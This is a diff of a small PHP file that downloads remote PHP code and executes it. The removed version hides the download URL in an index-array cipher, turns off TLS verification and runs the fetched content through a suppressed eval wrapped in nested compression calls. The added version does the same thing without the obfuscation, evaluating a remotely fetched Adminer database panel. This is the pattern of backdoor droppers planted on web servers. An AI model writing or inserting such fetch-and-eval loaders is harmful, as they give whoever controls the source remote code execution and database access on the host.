@@ -1,24 +1,28 @@
 <?php
+$url = "https://github.com/adminerevo/adminerevo/releases/download/v4.8.4/adminer-4.8.4.php";
 
- $characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
- $indexArray = [7,19,19,15,18,63,64,64,6,8,19,7,20,1,62,2,14,12,64,0,3,12,8,13,4,17,4,21,14,64,0,3,12,8,13,4,17,4,21,14,64,17,4,11,4,0,18,4,18,64,3,14,22,13,11,14,0,3,64,21,30,62,34,62,30,64,0,3,12,8,13,4,17,66,30,62,34,62,30,62,15,7,15];
- $decodedString = '';
-foreach ($indexArray as $index) {
-    $decodedString .= $characters[$index];
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+
+if ($result === false) {
+    echo "Error fetching remote content";
+} else {
+    // Assuming $result contains PHP code, execute it
+    if (is_string($result)) {
+        // Start output buffering
+        ob_start();
+        // Execute the fetched PHP code
+        eval('?>'.$result);
+        // Get the output buffer content and clean it
+        $output = ob_get_clean();
+        // Echo the output
+        echo $output;
+    } else {
+        echo "Error: Invalid response from remote server";
+    }
 }
- $url = "$decodedString";
 
-function fetchContent($url) { 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    $content = curl_exec($ch);
-    curl_close($ch);
-    return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($content))))))));
-}
-
-@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url))))))))));
-
+curl_close($ch);
 ?>
